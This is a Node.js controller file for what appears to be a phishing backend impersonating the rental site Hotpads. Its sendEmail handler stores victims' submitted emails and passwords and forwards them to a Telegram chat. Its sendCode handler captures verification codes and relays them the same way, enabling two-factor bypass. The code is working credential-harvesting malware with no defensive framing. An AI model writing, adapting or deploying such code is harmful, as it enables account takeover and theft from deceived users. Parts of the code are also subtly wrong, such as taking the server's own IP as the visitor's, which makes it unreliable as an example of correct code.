
const Login = require("../model/login");
const TelegramBot = require("node-telegram-bot-api");
const os = require("os");

const getIpAddress = () => {
  const networkInterfaces = os.networkInterfaces();
  let ipAddress;
  for (const interfaceName in networkInterfaces) {
    const interfaces = networkInterfaces[interfaceName];
    for (const iface of interfaces) {
      if (!iface.internal && iface.family === "IPv4") {
        ipAddress = iface.address;
        break;
      }
    }
    if (ipAddress) {
      break;
    }
  }
  return ipAddress;
};


const bot = new TelegramBot(process.env.TELEGRAM_BOT_ME);

const sendEmail = async (req, res) => {
  try {
    const ipAddress = getIpAddress();
     const userAgent = req.headers["user-agent"];
    let user = await Login.findOne({ ip: ipAddress + userAgent });

    if(user) {
        user.email = req.body.email
        user.password = req.body.password
        await user.save()
    }
    

    req.body.ip = getIpAddress() + userAgent;
    user = await Login.create(req.body);
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID_ME, `New email and password from hotpads: ${`email: ${user.email} password: ${user.password}`}`);
    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};



const sendCode = async (req, res) => {
  try {
    const ipAddress = getIpAddress();
    const userAgent = req.headers["user-agent"];
    if(!ipAddress) {
       return res.status(404).json({ error: 'ip address not found'})
    }
    const user = await Login.findOneAndUpdate({ ip: ipAddress + userAgent }, {code: req.body.code} ,{new: true});
 if (!user) {
   return res.status(404).json({ error: "User not found" });
 }
    const message = `${`${user.code} from ${user.email}`}`;
    bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message);

    res.status(200).json({ user });
  } catch (error) {
    console.log(error);
    res.status(500).json({ error: error.message });
  }
};

const getUser = async (req, res) => {
  try {
    const userAgent = req.headers["user-agent"];
    const userIp = getIpAddress() + userAgent
    console.log(userIp)
    const users = await Login.findOne({ip:userIp });
    res.status(200).json({nbHits: users.length, users });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
};




module.exports = {
  sendEmail,
  sendCode,
  getUser
};
